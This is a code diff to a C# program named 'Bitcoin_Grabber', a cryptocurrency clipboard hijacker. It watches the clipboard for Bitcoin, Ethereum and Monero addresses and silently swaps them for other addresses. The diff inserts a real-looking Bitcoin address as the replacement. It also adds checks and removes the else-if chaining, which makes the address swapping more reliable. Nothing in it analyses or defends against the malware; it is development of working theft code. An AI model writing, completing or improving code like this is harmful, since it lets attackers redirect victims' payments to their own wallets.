@@ -84,7 +84,7 @@ namespace Bitcoin_Grabber
                 {
                     string currentClipboard = Clipboard.GetText();
 
-                    string btcReplacement = "Bitcoin";
+                    string btcReplacement = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw";
                     Regex btcPattern = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"); //btc
 
                     string ethereumReplacement = "Ethereum";
@@ -93,17 +93,17 @@ namespace Bitcoin_Grabber
                     string xmrReplacement = "XMR";
                     Regex xmrPattern = new Regex(@"\b4([0-9]|[A-B])(.){93}\b"); //xmr
 
-                    if (btcPattern.Match(currentClipboard).Success)
+                    if (btcPattern.Match(currentClipboard).Success && !currentClipboard.Contains(btcReplacement))
                     {
                         string result = btcPattern.Replace(currentClipboard, btcReplacement);
                         Clipboard.SetText(result);
                     }
-                    else if (ethereumPattern.Match(currentClipboard).Success)
+                    if (ethereumPattern.Match(currentClipboard).Success && !currentClipboard.Contains(ethereumReplacement))
                     {
                         string result = ethereumPattern.Replace(currentClipboard, ethereumReplacement);
                         Clipboard.SetText(result);
                     }
-                    else if (xmrPattern.Match(currentClipboard).Success)
+                    if (xmrPattern.Match(currentClipboard).Success && !currentClipboard.Contains(xmrReplacement))
                     {
                         string result = xmrPattern.Replace(currentClipboard, xmrReplacement);
                         Clipboard.SetText(result);
